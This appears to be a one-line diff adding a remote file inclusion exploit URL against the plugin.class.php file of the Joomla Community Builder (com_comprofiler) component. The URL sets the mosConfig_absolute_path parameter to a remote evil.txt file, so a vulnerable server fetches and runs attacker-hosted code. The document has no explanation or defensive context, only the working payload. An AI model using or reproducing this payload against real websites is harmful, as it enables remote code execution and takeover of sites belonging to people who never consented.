@@ -1,0 +1,1 @@
+http://www.example.com/[path]/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=http://www.example.com/evil.txt?
